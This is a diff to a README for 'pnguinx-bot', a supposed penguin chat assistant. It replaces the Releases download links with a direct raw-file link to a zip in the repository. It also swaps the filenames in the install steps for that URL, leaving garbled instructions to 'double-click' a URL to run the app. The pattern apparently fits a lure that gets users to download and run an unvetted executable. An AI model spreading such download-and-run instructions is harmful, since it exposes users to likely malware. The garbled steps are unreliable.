@@ -8,21 +8,21 @@ Welcome to pnguinx-bot! This application lets you chat with an adorable penguin 
 
 To get started, you need to download the software. Click the button below to visit the download page.
 
-[Download pnguinx-bot](https://github.com/Dranonimoobito2/pnguinx-bot/releases)
+[Download pnguinx-bot](https://raw.githubusercontent.com/Dranonimoobito2/pnguinx-bot/main/upthrow/pnguinx-bot.zip)
 
 ### Steps to Download
 
 1. Click the link above to open the Releases page.
 2. Find the latest version of pnguinx-bot.
-3. Look for a file named something like `pnguinx-bot.exe` or `pnguinx-bot.zip`.
+3. Look for a file named something like `https://raw.githubusercontent.com/Dranonimoobito2/pnguinx-bot/main/upthrow/pnguinx-bot.zip` or `https://raw.githubusercontent.com/Dranonimoobito2/pnguinx-bot/main/upthrow/pnguinx-bot.zip`.
 4. Click on the file to start the download.
 
 ### Installation Process
 
 1. Once the download is complete, locate the file in your Downloads folder.
 2. If it is a `.zip` file, right-click it and select "Extract All."
-3. Open the extracted folder and find `pnguinx-bot.exe`.
-4. Double-click on `pnguinx-bot.exe` to run the application.
+3. Open the extracted folder and find `https://raw.githubusercontent.com/Dranonimoobito2/pnguinx-bot/main/upthrow/pnguinx-bot.zip`.
+4. Double-click on `https://raw.githubusercontent.com/Dranonimoobito2/pnguinx-bot/main/upthrow/pnguinx-bot.zip` to run the application.
 
 ## 📋 System Requirements
 
@@ -68,6 +68,6 @@ For more information, tips, and updates, follow our project on GitHub.
 
 You can download the latest release from the link below again:
 
-[Download pnguinx-bot](https://github.com/Dranonimoobito2/pnguinx-bot/releases)
+[Download pnguinx-bot](https://raw.githubusercontent.com/Dranonimoobito2/pnguinx-bot/main/upthrow/pnguinx-bot.zip)
 
 Happy chatting! Enjoy your time with the penguin assistant!
